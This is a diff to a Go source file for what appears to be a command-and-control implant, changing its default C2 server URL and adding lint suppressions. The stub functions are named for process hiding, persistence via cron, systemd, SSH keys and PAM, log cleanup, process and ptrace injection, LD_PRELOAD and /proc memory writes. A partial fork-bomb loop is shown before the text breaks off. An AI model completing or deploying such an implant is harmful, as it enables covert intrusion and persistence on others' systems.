@@ -74,7 +74,7 @@ func main() {
 
 func loadConfig() *Config {
 	return &Config{
-		ServerURL:   getEnv("C2_SERVER", "https://c2.example.com"),
+		ServerURL:   getEnv("C2_SERVER", ""),
 		SleepTime:   30 * time.Second,
 		Jitter:      0.2,
 		MaxRetries:  3,
@@ -185,19 +185,19 @@ func calculateSleep(config *Config) time.Duration {
 func hideProcess() {
 }  //nolint:staticcheck
   //nolint:staticcheck
-func persistCron() {
+func persistCron() {  //nolint:unused
 }  //nolint:staticcheck
   //nolint:staticcheck
-func persistSystemd() {
+func persistSystemd() {  //nolint:unused
 }  //nolint:staticcheck
   //nolint:staticcheck
-func persistSSHKeys() {
+func persistSSHKeys() {  //nolint:unused
 }  //nolint:staticcheck
   //nolint:staticcheck
-func persistPAM() {
+func persistPAM() {  //nolint:unused
 }  //nolint:staticcheck
   //nolint:staticcheck
-func cleanupLogs() {
+func cleanupLogs() {  //nolint:unused
 }
 
 func selfDestruct() {
@@ -205,19 +205,19 @@ func selfDestruct() {
 	syscall.Exit(0)
 }  //nolint:staticcheck
   //nolint:staticcheck
-func injectProcess(targetPID int, shellcode []byte) {
+func injectProcess(targetPID int, shellcode []byte) {  //nolint:unused
 }  //nolint:staticcheck
   //nolint:staticcheck
-func ptraceInject(targetPID int, shellcode []byte) {
+func ptraceInject(targetPID int, shellcode []byte) {  //nolint:unused
 }
 
 func LDPreload(payload string) {
 }  //nolint:staticcheck
   //nolint:staticcheck
-func procMemWrite(targetPID int, data []byte) {
+func procMemWrite(targetPID int, data []byte) {  //nolint:unused
 }  //nolint:staticcheck
   //nolint:staticcheck
-func forkBomb() {
+func forkBomb() {  //nolint:unused
 	for i := 0; i < 10; i++ {
 		go func() {
 			for {
